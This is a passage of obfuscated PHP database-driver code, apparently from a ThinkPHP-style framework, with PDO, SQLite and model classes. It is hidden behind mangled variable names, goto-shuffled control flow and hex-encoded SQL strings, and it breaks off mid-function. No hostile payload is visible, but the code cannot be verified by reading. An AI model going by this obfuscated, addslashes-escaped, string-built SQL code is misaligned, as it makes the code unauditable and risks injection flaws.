$f¹®ØöùÈ) { $Bƒº‰µ„Æö = $this->parseValue($f¹®ØöùÈ); if (is_scalar($Bƒº‰µ„Æö)) { $bŞ°î™¨¦¨[] = $Bƒº‰µ„Æö; $f“­·¡•òğ[] = $this->parseKey($FÕ†»¥ì×); } } $CË†ªØ‹× = $DÀ¤à±çÅâ[814] . $this->parseTable($F²¤ŠÜŸË¦[$DÀ¤à±çÅâ[275]]) . $DÀ¤à±çÅâ[815] . implode($DÀ¤à±çÅâ[47], $f“­·¡•òğ) . $DÀ¤à±çÅâ[816] . implode($DÀ¤à±çÅâ[47], $bŞ°î™¨¦¨) . $DÀ¤à±çÅâ[817]; return $this->execute($CË†ªØ‹×); } public function insertAll($E°ÛˆÄéÜ·, $eÃ’…¯ùè = array(), $f¯Êº¡šĞ™ = false) { goto D‹•Ê­‰; B¬ğĞæÌ: $eÆŒ¨¨œÍ³ = ($f¯Êº¡šĞ™ ? $fØ¾áÂ°¿[819] : $fØ¾áÂ°¿[820]) . $fØ¾áÂ°¿[821] . $this->parseTable($eÃ’…¯ùè[$fØ¾áÂ°¿[275]]) . $fØ¾áÂ°¿[815] . implode($fØ¾áÂ°¿[47], $cÌƒâ¼àç) . $fØ¾áÂ°¿[822] . implode($fØ¾áÂ°¿[47], $F„ ´ê¹‡); return $this->execute($eÆŒ¨¨œÍ³); goto B¾ö•Ô·è‚; D‹•Ê­‰: $fØ¾áÂ°¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!is_array($E°ÛˆÄéÜ·[0])) { return !1; } $cÌƒâ¼àç = array_keys($E°ÛˆÄéÜ·[0]); goto EÎ©ğ´àÔİ; EÎ©ğ´àÔİ: $F„ ´ê¹‡ = array(); foreach ($E°ÛˆÄéÜ· as $c®•ÊÕê‘) { $c¿«ÔœÈ² = array(); foreach ($c®•ÊÕê‘ as $e·À²æ­¾‚ => $a™ÎòäŸ) { $a™ÎòäŸ = $this->parseValue($a™ÎòäŸ); if (is_scalar($a™ÎòäŸ)) { $c¿«ÔœÈ²[] = $a™ÎòäŸ; } } $F„ ´ê¹‡[] = $fØ¾áÂ°¿[256] . implode($fØ¾áÂ°¿[47], $c¿«ÔœÈ²) . $fØ¾áÂ°¿[817]; } array_walk($cÌƒâ¼àç, array($this, $fØ¾áÂ°¿[818])); goto B¬ğĞæÌ; B¾ö•Ô·è‚: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $C‚Ş«²ªÅ› =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->error = $this->_linkID->errno . $C‚Ş«²ªÅ›[4] . $this->_linkID->error; if ($C‚Ş«²ªÅ›[33] != $this->queryStr) { $this->error .= LNG($C‚Ş«²ªÅ›[45]) . $this->queryStr; } think_trace($this->error, $C‚Ş«²ªÅ›[33], $C‚Ş«²ªÅ›[46]); return $this->error; } public function escapeString($eËÏ¸‡ÂŠŒ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eËÏ¸‡ÂŠŒ); } else { return addslashes($eËÏ¸‡ÂŠŒ); } } public function parseKey(&$C™Â‰İÈ“ó, $dá¯Ëô±©ó = true) { $C¨©ÎÅ©Ì =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($dá¯Ëô±©ó) { $C™Â‰İÈ“ó = $this->parseKeyCheck($C™Â‰İÈ“ó); } if ($C™Â‰İÈ“ó != $C¨©ÎÅ©Ì[182] && !preg_match($C¨©ÎÅ©Ì[823], $C™Â‰İÈ“ó)) { $C™Â‰İÈ“ó = $C¨©ÎÅ©Ì[377] . trim($C™Â‰İÈ“ó, $C¨©ÎÅ©Ì[377]) . $C¨©ÎÅ©Ì[377]; } return $C™Â‰İÈ“ó; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($aÓí˜Ñš© = '') { $dÚÄíİª‘Å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!class_exists($dÚÄíİª‘Å[825])) { think_exception(think_lang($dÚÄíİª‘Å[10]) . $dÚÄíİª‘Å[826]); } if (!empty($aÓí˜Ñš©)) { $this->config = $aÓí˜Ñš©; if (empty($this->config[$dÚÄíİª‘Å[13]])) { $this->config[$dÚÄíİª‘Å[13]] = array(); } } } public function connect($DäÇŞÎÑ“ = '', $e×èŸÑ­Î = 0) { $fò²‡˜á§“ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!isset($this->linkID[$e×èŸÑ­Î])) { goto c³å¡™ó…; AßÕæ¹Šê: try { $this->linkID[$e×èŸÑ­Î] = new PDO($DäÇŞÎÑ“[$fò²‡˜á§“[827]], $DäÇŞÎÑ“[$fò²‡˜á§“[800]], $DäÇŞÎÑ“[$fò²‡˜á§“[801]], $DäÇŞÎÑ“[$fò²‡˜á§“[13]]); } catch (PDOException $EöîÇµ†éƒ) { think_exception($EöîÇµ†éƒ->getMessage()); } $this->dbType = $this->_getDsnType($DäÇŞÎÑ“[$fò²‡˜á§“[827]]); if (in_array($this->dbType, array($fò²‡˜á§“[828], $fò²‡˜á§“[829], $fò²‡˜á§“[830], $fò²‡˜á§“[831]))) { think_exception($fò²‡˜á§“[832] . $this->dbType . $fò²‡˜á§“[833] . $this->dbType . $fò²‡˜á§“[834]); } goto c½ÏÓ°ã—„; c½ÏÓ°ã—„: if (!$this->linkID[$e×èŸÑ­Î]) { think_exception($fò²‡˜á§“[835]); } try { $this->linkID[$e×èŸÑ­Î]->exec($fò²‡˜á§“[836] . think_config($fò²‡˜á§“[803])); } catch (Exception $EöîÇµ†éƒ) { } $this->connected = !0; goto EÁâ‚®“İÅ; EÁâ‚®“İÅ: if (1 != think_config($fò²‡˜á§“[18])) { unset($this->config); } goto a¨İíí®ñ; c³å¡™ó…: if (empty($DäÇŞÎÑ“)) { $DäÇŞÎÑ“ = $this->config; } $b†æÆ´ù = !empty($DäÇŞÎÑ“[$fò²‡˜á§“[13]][$fò²‡˜á§“[14]]) ? $DäÇŞÎÑ“[$fò²‡˜á§“[13]][$fò²‡˜á§“[14]] : $this->pconnect; if ($b†æÆ´ù) { $DäÇŞÎÑ“[$fò²‡˜á§“[13]][PDO::ATTR_PERSISTENT] = !0; } goto AßÕæ¹Šê; a¨İíí®ñ: } return $this->linkID[$e×èŸÑ­Î]; } public function free() { $this->PDOStatement = null; } public function query($F¢ ¶ËöÖ©, $BøÈ·Û·¤Ä = array()) { goto F—«•¼‘Œù; F—«•¼‘Œù: $F¸”ùø¯Ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CáÅ°‰êĞ—; B‚Ñ¾Äïæó: if (!1 === $Dšøøñ ïÊ) { $this->error(); return !1; } else { return $this->getAll(); } goto fËÛÃ‡ì¨ò; dµÆÒÔâÙÌ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Dšøøñ ïÊ = $this->PDOStatement->execute($BøÈ·Û·¤Ä); $this->debug(); goto B‚Ñ¾Äïæó; CáÅ°‰êĞ—: $this->queryStr = $F¢ ¶ËöÖ©; if (!empty($BøÈ·Û·¤Ä)) { $this->queryStr .= $F¸”ùø¯Ó[837] . print_r($BøÈ·Û·¤Ä, !0) . $F¸”ùø¯Ó[838]; } if (!empty($this->PDOStatement)) { $this->free(); } goto D¢ÔÀŒğª™; D¢ÔÀŒğª™: think_action_status($F¸”ùø¯Ó[19], 1); think_status($F¸”ùø¯Ó[20]); $this->PDOStatement = $this->_linkID->prepare($F¢ ¶ËöÖ©); goto dµÆÒÔâÙÌ; fËÛÃ‡ì¨ò: } public function execute($D£÷íõ‹¡‡, $BÏöØ±×è = array()) { goto eµ…­®ëÛ‘; aãŒ¯ß„íÀ: think_status($f™Æğ»ƒñã[20]); $this->PDOStatement = $this->_linkID->prepare($D£÷íõ‹¡‡); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto BÒ²Öå’¸; BÒ²Öå’¸: $eÑñÛÄ¹†­ = $this->PDOStatement->execute($BÏöØ±×è); $this->debug(); if (!1 === $eÑñÛÄ¹†­) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($bİ«†ò›˜» || preg_match($f™Æğ»ƒñã[843], $D£÷íõ‹¡‡)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto C‹æĞ¹‘ª; eµ…­®ëÛ‘: $f™Æğ»ƒñã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÙ„—Ë‹¯µ; c…Êƒ©¹¯£: if ($this->dbType == $f™Æğ»ƒñã[831]) { if (preg_match($f™Æğ»ƒñã[839], $this->queryStr, $A…Åº¶ÈÈØ)) { $this->table = think_config($f™Æğ»ƒñã[840]) . str_ireplace(think_config($f™Æğ»ƒñã[841]), $f™Æğ»ƒñã[370], $A…Åº¶ÈÈØ[2]); $bİ«†ò›˜» = (bool) $this->query($f™Æğ»ƒñã[842] . strtoupper($this->table) . $f™Æğ»ƒñã[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($f™Æğ»ƒñã[21], 1); goto aãŒ¯ß„íÀ; bÙ„—Ë‹¯µ: $this->queryStr = $D£÷íõ‹¡‡; if (!empty($BÏöØ±×è)) { $this->queryStr .= $f™Æğ»ƒñã[837] . print_r($BÏöØ±×è, !0) . $f™Æğ»ƒñã[838]; } $bİ«†ò›˜» = !1; goto c…Êƒ©¹¯£; C‹æĞ¹‘ª: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CŞ‘§ãÈŞô = $this->_linkID->commit(); $this->transTimes = 0; if (!$CŞ‘§ãÈŞô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dïó·”ŸÒ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dïó·”ŸÒ) { $this->error(); return !1; } } return !0; } private function getAll() { $dÖÄ±ß¸£ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($dÖÄ±ß¸£); return $dÖÄ±ß¸£; } public function getFields($a‹ƒ¨ÂÓ‘Ö) { goto a«Ğ¦ÎŒš; a«Ğ¦ÎŒš: $b¬Ç£Ïá³† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->initConnect(!0); if (think_config($b¬Ç£Ïá³†[844])) { $Aæ·®æÏ½ = str_replace($b¬Ç£Ïá³†[845], $a‹ƒ¨ÂÓ‘Ö, think_config($b¬Ç£Ïá³†[844])); } else { switch ($this->dbType) { case $b¬Ç£Ïá³†[828]: case $b¬Ç£Ïá³†[846]: $Aæ·®æÏ½ = "\x53\105\x4c\x45\103\124\40\x20\40\x63\157\154\165\155\x6e\x5f\x6e\141\x6d\145\40\141\x73\40\47\116\141\x6d\145\47\x2c\x20\x20\x20\x64\x61\x74\x61\137\164\x79\160\145\40\141\x73\x20\47\x54\x79\x70\x65\x27\x2c\x20\x20\x20\143\x6f\x6c\165\155\156\x5f\144\x65\x66\x61\x75\x6c\x74\40\141\x73\40\47\x44\x65\x66\141\x75\154\x74\x27\x2c\40\x20\x20\151\x73\x5f\156\165\154\x6c\x61\x62\154\x65\40\141\x73\40\47\x4e\165\154\x6c\x27\12\x9\11\106\x52\x4f\115\11\x69\x6e\146\x6f\162\155\141\164\151\157\156\137\163\x63\x68\x65\x6d\141\x2e\164\141\142\154\x65\x73\x20\x41\x53\40\164\xa\x9\x9\x4a\x4f\111\116\11\x69\156\146\x6f\162\155\141\164\x69\157\156\x5f\163\143\x68\145\x6d\x61\56\x63\x6f\154\x75\155\x6e\163\x20\101\123\40\x63\12\x9\x9\117\x4e\40\40\164\56\x74\x61\142\x6c\x65\137\x63\x61\164\x61\x6c\x6f\147\x20\x3d\40\x63\x2e\x74\141\x62\x6c\145\x5f\x63\x61\164\141\154\157\147\12\x9\x9\x41\x4e\x44\40\164\56\164\141\x62\x6c\x65\x5f\x73\143\x68\145\x6d\x61\x20\x3d\40\143\56\x74\141\x62\154\145\137\163\143\x68\145\x6d\x61\12\x9\11\101\x4e\104\x20\164\x2e\x74\x61\142\x6c\x65\137\x6e\141\x6d\x65\x20\x3d\40\143\x2e\x74\141\x62\x6c\x65\137\156\x61\155\x65\12\11\x9\127\x48\105\122\x45\x20\x20\40\x74\x2e\x74\x61\x62\x6c\x65\137\156\x61\x6d\145\x20\75\40\x27{$a‹ƒ¨ÂÓ‘Ö}\47"; break; case $b¬Ç£Ïá³†[847]: $Aæ·®æÏ½ = $b¬Ç£Ïá³†[848] . $a‹ƒ¨ÂÓ‘Ö . $b¬Ç£Ïá³†[849]; break; case $b¬Ç£Ïá³†[829]: case $b¬Ç£Ïá³†[831]: $Aæ·®æÏ½ = $b¬Ç£Ïá³†[850] . $b¬Ç£Ïá³†[851] . $b¬Ç£Ïá³†[852] . strtoupper($a‹ƒ¨ÂÓ‘Ö) . $b¬Ç£Ïá³†[853] . strtoupper($a‹ƒ¨ÂÓ‘Ö) . $b¬Ç£Ïá³†[854]; break; case $b¬Ç£Ïá³†[855]: $Aæ·®æÏ½ = $b¬Ç£Ïá³†[856] . $a‹ƒ¨ÂÓ‘Ö . $b¬Ç£Ïá³†[857]; break; case $b¬Ç£Ïá³†[830]: break; case $b¬Ç£Ïá³†[858]: default: $Aæ·®æÏ½ = $b¬Ç£Ïá³†[859] . ($this->dbType == $b¬Ç£Ïá³†[858] ? "\x60{$a‹ƒ¨ÂÓ‘Ö}\140" : $a‹ƒ¨ÂÓ‘Ö); } } goto bÀœÚŠ; bÀœÚŠ: $b™‰¶Ä–İ = $this->query($Aæ·®æÏ½); $a®ïØî’Ù‚ = array(); if ($b™‰¶Ä–İ) { foreach ($b™‰¶Ä–İ as $cõêù‚ÙéÈ => $DÄºˆ´÷§) { $DÄºˆ´÷§ = array_change_key_case($DÄºˆ´÷§); $DÄºˆ´÷§[$b¬Ç£Ïá³†[28]] = isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[28]]) ? $DÄºˆ´÷§[$b¬Ç£Ïá³†[28]] : $b¬Ç£Ïá³†[370]; $DÄºˆ´÷§[$b¬Ç£Ïá³†[29]] = isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[29]]) ? $DÄºˆ´÷§[$b¬Ç£Ïá³†[29]] : $b¬Ç£Ïá³†[370]; $e¡­£©½— = isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[269]]) ? $DÄºˆ´÷§[$b¬Ç£Ïá³†[269]] : $DÄºˆ´÷§[$b¬Ç£Ïá³†[28]]; $a®ïØî’Ù‚[$e¡­£©½—] = array($b¬Ç£Ïá³†[28] => $e¡­£©½—, $b¬Ç£Ïá³†[29] => $DÄºˆ´÷§[$b¬Ç£Ïá³†[29]], $b¬Ç£Ïá³†[31] => (bool) (isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[102]]) && $DÄºˆ´÷§[$b¬Ç£Ïá³†[102]] === $b¬Ç£Ïá³†[33] || isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[31]]) && $DÄºˆ´÷§[$b¬Ç£Ïá³†[31]] === $b¬Ç£Ïá³†[33]), $b¬Ç£Ïá³†[34] => isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[34]]) ? $DÄºˆ´÷§[$b¬Ç£Ïá³†[34]] : (isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[53]]) ? $DÄºˆ´÷§[$b¬Ç£Ïá³†[53]] : $b¬Ç£Ïá³†[370]), $b¬Ç£Ïá³†[36] => isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[92]]) ? strtolower($DÄºˆ´÷§[$b¬Ç£Ïá³†[92]]) == $b¬Ç£Ïá³†[38] : (isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[54]]) ? $DÄºˆ´÷§[$b¬Ç£Ïá³†[54]] : !1), $b¬Ç£Ïá³†[39] => isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[860]]) ? strtolower($DÄºˆ´÷§[$b¬Ç£Ïá³†[860]]) == $b¬Ç£Ïá³†[41] : (isset($DÄºˆ´÷§[$b¬Ç£Ïá³†[92]]) ? $DÄºˆ´÷§[$b¬Ç£Ïá³†[92]] : !1)); } } goto Bâ¥øïŸš; Bâ¥øïŸš: return $a®ïØî’Ù‚; goto aãºŞˆè×; aãºŞˆè×: } public function getTables($EÒè¶éÈò¿ = '') { $bÎˆãí×®‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (think_config($bÎˆãí×®‡[861])) { $FŒ£Áùß´ = str_replace($bÎˆãí×®‡[862], $EÒè¶éÈò¿, think_config($bÎˆãí×®‡[861])); } else { switch ($this->dbType) { case $bÎˆãí×®‡[829]: case $bÎˆãí×®‡[831]: $FŒ£Áùß´ = $bÎˆãí×®‡[863]; break; case $bÎˆãí×®‡[828]: case $bÎˆãí×®‡[846]: $FŒ£Áùß´ = $bÎˆãí×®‡[864]; break; case $bÎˆãí×®‡[855]: $FŒ£Áùß´ = $bÎˆãí×®‡[865]; break; case $bÎˆãí×®‡[830]: think_exception(think_lang($bÎˆãí×®‡[866]) . $bÎˆãí×®‡[867]); break; case $bÎˆãí×®‡[847]: $FŒ£Áùß´ = $bÎˆãí×®‡[42] . $bÎˆãí×®‡[43] . $bÎˆãí×®‡[44]; break; case $bÎˆãí×®‡[858]: default: if (!empty($EÒè¶éÈò¿)) { $FŒ£Áùß´ = $bÎˆãí×®‡[811] . $EÒè¶éÈò¿ . $bÎˆãí×®‡[812]; } else { $FŒ£Áùß´ = $bÎˆãí×®‡[813]; } } } $eõĞÂµõ´œ = $this->query($FŒ£Áùß´); $aÛÆÓ­§­ï = array(); foreach ($eõĞÂµõ´œ as $a®ÜŒ¶´ => $C“ï’ø«) { $aÛÆÓ­§­ï[$a®ÜŒ¶´] = current($C“ï’ø«); } return $aÛÆÓ­§­ï; } protected function parseLimit($FĞƒ×Û‹åœ) { $a‘ÎÅ ‹‚ğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÛïñ²ÊÑÁ = $a‘ÎÅ ‹‚ğ[33]; if (!empty($FĞƒ×Û‹åœ)) { switch ($this->dbType) { case $a‘ÎÅ ‹‚ğ[855]: case $a‘ÎÅ ‹‚ğ[847]: $FĞƒ×Û‹åœ = explode($a‘ÎÅ ‹‚ğ[47], $FĞƒ×Û‹åœ); if (count($FĞƒ×Û‹åœ) > 1) { $eÛïñ²ÊÑÁ .= $a‘ÎÅ ‹‚ğ[48] . $FĞƒ×Û‹åœ[1] . $a‘ÎÅ ‹‚ğ[49] . $FĞƒ×Û‹åœ[0] . $a‘ÎÅ ‹‚ğ[50]; } else { $eÛïñ²ÊÑÁ .= $a‘ÎÅ ‹‚ğ[48] . $FĞƒ×Û‹åœ[0] . $a‘ÎÅ ‹‚ğ[50]; } break; case $a‘ÎÅ ‹‚ğ[828]: case $a‘ÎÅ ‹‚ğ[846]: break; case $a‘ÎÅ ‹‚ğ[830]: break; case $a‘ÎÅ ‹‚ğ[829]: case $a‘ÎÅ ‹‚ğ[831]: break; case $a‘ÎÅ ‹‚ğ[858]: default: $eÛïñ²ÊÑÁ .= $a‘ÎÅ ‹‚ğ[48] . $FĞƒ×Û‹åœ . $a‘ÎÅ ‹‚ğ[50]; } } return $eÛïñ²ÊÑÁ; } public function parseKey(&$eŠ‹ËœÔ¬‰, $bÒœÇîÆì² = true) { $díõ ã¾Œ¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($bÒœÇîÆì²) { $eŠ‹ËœÔ¬‰ = $this->parseKeyCheck($eŠ‹ËœÔ¬‰); } if ($this->dbType == $díõ ã¾Œ¶[858]) { if ($eŠ‹ËœÔ¬‰ != $díõ ã¾Œ¶[182] && !preg_match($díõ ã¾Œ¶[823], $eŠ‹ËœÔ¬‰)) { $eŠ‹ËœÔ¬‰ = $díõ ã¾Œ¶[377] . trim($eŠ‹ËœÔ¬‰, $díõ ã¾Œ¶[377]) . $díõ ã¾Œ¶[377]; } return $eŠ‹ËœÔ¬‰; } else { return parent::parseKey($eŠ‹ËœÔ¬‰); } } public function close() { $this->_linkID = null; } public function error() { $a¯½¹˜¹îÜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->PDOStatement) { $D‹ìë‡ÓŞÛ = $this->PDOStatement->errorInfo(); $this->error = $D‹ìë‡ÓŞÛ[1] . $a¯½¹˜¹îÜ[4] . $D‹ìë‡ÓŞÛ[2]; } else { $this->error = $a¯½¹˜¹îÜ[33]; } if ($a¯½¹˜¹îÜ[33] != $this->queryStr) { $this->error .= LNG($a¯½¹˜¹îÜ[45]) . $this->queryStr; } think_trace($this->error, $a¯½¹˜¹îÜ[33], $a¯½¹˜¹îÜ[46]); return $this->error; } public function escapeString($eß¡ÒËÆ) { $BÛñ‡ÕÕÄ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; switch ($this->dbType) { case $BÛñ‡ÕÕÄ[855]: case $BÛñ‡ÕÕÄ[828]: case $BÛñ‡ÕÕÄ[846]: case $BÛñ‡ÕÕÄ[858]: return addslashes($eß¡ÒËÆ); case $BÛñ‡ÕÕÄ[830]: case $BÛñ‡ÕÕÄ[847]: case $BÛñ‡ÕÕÄ[829]: case $BÛñ‡ÕÕÄ[831]: return str_ireplace($BÛñ‡ÕÕÄ[55], $BÛñ‡ÕÕÄ[56], $eß¡ÒËÆ); } } protected function parseValue($aèî÷½æ¡®) { $eè³ïŸâ‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (is_string($aèî÷½æ¡®)) { $aèî÷½æ¡® = strpos($aèî÷½æ¡®, $eè³ïŸâ‹[4]) === 0 ? $this->escapeString($aèî÷½æ¡®) : $eè³ïŸâ‹[868] . $this->escapeString($aèî÷½æ¡®) . $eè³ïŸâ‹[868]; } elseif (isset($aèî÷½æ¡®[0]) && is_string($aèî÷½æ¡®[0]) && strtolower($aèî÷½æ¡®[0]) == $eè³ïŸâ‹[293]) { $aèî÷½æ¡® = $this->escapeString($aèî÷½æ¡®[1]); } elseif (is_array($aèî÷½æ¡®)) { $aèî÷½æ¡® = array_map(array($this, $eè³ïŸâ‹[869]), $aèî÷½æ¡®); } elseif (is_bool($aèî÷½æ¡®)) { $aèî÷½æ¡® = $aèî÷½æ¡® ? $eè³ïŸâ‹[86] : $eè³ïŸâ‹[486]; } elseif (is_null($aèî÷½æ¡®)) { $aèî÷½æ¡® = $eè³ïŸâ‹[102]; } return $aèî÷½æ¡®; } public function getLastInsertId() { $dš›¢á¹‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; switch ($this->dbType) { case $dš›¢á¹‰[855]: case $dš›¢á¹‰[847]: case $dš›¢á¹‰[828]: case $dš›¢á¹‰[846]: case $dš›¢á¹‰[830]: case $dš›¢á¹‰[858]: return $this->_linkID->lastInsertId(); case $dš›¢á¹‰[829]: case $dš›¢á¹‰[831]: $E±Æ§ø¤º = $this->table; $Bä‘Ñµ¹ØÀ = $this->query("\123\x45\114\105\103\124\x20{$E±Æ§ø¤º}\x2e\x63\x75\162\x72\166\141\x6c\40\x63\165\x72\162\x76\x61\x6c\x20\x46\122\117\115\40\x64\x75\x61\154"); return $Bä‘Ñµ¹ØÀ ? $Bä‘Ñµ¹ØÀ[0][$dš›¢á¹‰[870]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($FæõÏš§¨ ) { $EŸ™å ßå¦ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!CacheLock::fileLock($EŸ™å ßå¦[9])) { return !1; } $f®Á¶°„í = parent::query($FæõÏš§¨ ); CacheLock::fileUnLock($EŸ™å ßå¦[9]); return $f®Á¶°„í; } public function execute($BÚÈ‚Åäƒƒ) { $e “††‘…İ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!CacheLock::fileLock($e “††‘…İ[9])) { return !1; } $fÛøôÅ¡Şò = parent::execute($BÚÈ‚Åäƒƒ); CacheLock::fileUnLock($e “††‘…İ[9]); return $fÛøôÅ¡Şò; } } goto ağ·ŠÃ ö•; b­›Õ¬‘Á‰: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\x69\155\145", "\164\151\x6d\x65", "\151\156\163\x65\162\x74\54\x75\160\x64\141\x74\x65", "\146\x75\x6e\x63\164\151\157\x6e"), array("\143\162\x65\141\164\145\124\x69\x6d\x65", "\164\151\155\145", "\x69\x6e\163\x65\162\164", "\146\x75\x6e\x63\164\x69\x6f\156")); public function setDataAuto($d²ƒÃùÏ¹…) { $this->dataAuto = $d²ƒÃùÏ¹…; } public function __construct($Aâ¬¢Ñ¶“³ = '', $FÀÎ¼Ì’Œ = '', $aŸÑÀ”İ = '') { parent::__construct($Aâ¬¢Ñ¶“³, $FÀÎ¼Ì’Œ, $aŸÑÀ”İ); } public static function textEncode($aÜÙêíå¹…) { if (!$aÜÙêíå¹…) { return $aÜÙêíå¹…; } $b”›Œõ¤® = json_encode($aÜÙêíå¹…); $b”›Œõ¤® = preg_replace_callback($_SERVER[ó¬â¥‰ÊÔ¤Ç£][351], function ($fÍ­çÃë‹œ) { return addslashes($fÍ­çÃë‹œ[0]); }, $b”›Œõ¤®); return json_decode($b”›Œõ¤®); } public static function textDecode($D÷ïÓ¾æğË) { $aŒï•ñõÀ• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F³êé—Ø¦â = json_encode($D÷ïÓ¾æğË); $F³êé—Ø¦â = preg_replace_callback($aŒï•ñõÀ•[352], function ($fÚìÚ¹”ï) { return $_SERVER[ó¬â¥‰ÊÔ¤Ç£][96]; }, $F³êé—Ø¦â); return json_decode($F³êé—Ø¦â); } protected $tableMeta = array(); protected function _beforeInsert(&$c—°…ğñ…Œ, $cÑ—±¶¢ê­) { $C¼É«¼ãâ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->checkDataAutoHas($C¼É«¼ãâ[353])) { return; } $this->dataBeforeFilter($c—°…ğñ…Œ, $C¼É«¼ãâ[353]); } protected function _beforeUpdate(&$E­»¯¶ñ‰Ğ, $d¨ÍğÅ) { $eĞÉÂöŒ‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->checkDataAutoHas($eĞÉÂöŒ‰[354])) { return; } $this->dataBeforeFilter($E­»¯¶ñ‰Ğ, $eĞÉÂöŒ‰[354]); } protected function _afterSelect(&$F¢Î³¢¹…‘, $C†¥Í•ò×) { if (!is_array($F¢Î³¢¹…‘)) { return; } if (!$this->checkDataAutoHas($_SERVER[ó¬â¥‰ÊÔ¤Ç£][355])) { return; } foreach ($F¢Î³¢¹…‘ as &$fˆ²¼•¿–) { $this->dataAfterFilter($fˆ²¼•¿–); } unset($fˆ²¼•¿–); } protected function _afterFind(&$dáÃ‹‰©ª´, $DÙË†ò¢ÑÄ) { if (!is_array($dáÃ‹‰©ª´)) { return; } if (!$this->checkDataAutoHas($_SERVER[ó¬â¥‰ÊÔ¤Ç£][355])) { return; } $this->dataAfterFilter($dáÃ‹‰©ª´); } public function setAutoIncrement($D«ƒ®©‰†) { $eåêªîÅ…‹ = array($this->getPk() => $D«ƒ®©‰†); $BÌÜ¤·í¿ë = $this->data($eåêªîÅ…‹)->add(); if ($BÌÜ¤·í¿ë) { $this->delete($BÌÜ¤·í¿ë); } } public function getAutoIncrement() { $Dˆ¸àê÷ğ = $this->getTableName(); $añ™°³ôš = $this->max($this->getPk()); $dø’âË†‘õ = $this->query("\163\150\157\x77\x20\164\141\x62\154\x65\x20\x73\164\x61\x74\165\x73\x20\x77\150\x65\162\145\40\x4e\141\x6d\145\75\47{$Dˆ¸àê÷ğ}\47"); $F¶òƒáíä£ = $dø’âË†‘õ[0][$_SERVER[ó¬â¥‰ÊÔ¤Ç£][356]]; $bœ·ÓîâÔ¼ = max($añ™°³ôš, $F¶òƒáíä£); return $bœ·ÓîâÔ¼; } protected function _callBefore($EÂÍïÉ„, $Aê•ÎÅ™œ) { return $this->cacheCallCheck($EÂÍïÉ„, $Aê•ÎÅ™œ, !1); } protected function _callAfter($EœÛöµ‡¢, $CˆÉçã‹ô) { return $this->cacheCallCheck($EœÛöµ‡¢, $CˆÉçã‹ô, !0); } protected function cacheFunctionAlias($f•Ë§ëİç®) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($eëòˆÆ™§ñ, $c§Ş³›¹‘, $AŠ„ë¢µÆæ = false) { $dÓ…‰æëÅÄ = $this->cacheFunctionAlias($c§Ş³›¹‘); if (!$dÓ…‰æëÅÄ) { return; } foreach ($dÓ…‰æëÅÄ as $D†ô‚ÀÍ´ê => $eÂ›—ÚˆƒŸ) { $B¸õ÷“²ã = $eÂ›—ÚˆƒŸ[0]; $fÕ¼á²‰ = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][47], $eÂ›—ÚˆƒŸ[1]); if ($eëòˆÆ™§ñ == $D†ô‚ÀÍ´ê) { return $this->cacheFunctionGet($D†ô‚ÀÍ´ê, $B¸õ÷“²ã); } if ($AŠ„ë¢µÆæ && in_array($eëòˆÆ™§ñ, $fÕ¼á²‰)) { $this->cacheFunctionClear($D†ô‚ÀÍ´ê, $B¸õ÷“²ã); } } } public function cacheFunctionGet($A±®ê´ÑÑ, $cÒ‡‚í¾«¾) { $C¯Ô‚ÈˆŸ› = $this->cacheKeyMake($A±®ê´ÑÑ, $cÒ‡‚í¾«¾); $Fë³á°¡ê– = Cache::get($C¯Ô‚ÈˆŸ›); if (!is_array($Fë³á°¡ê–)) { $Fë³á°¡ê– = 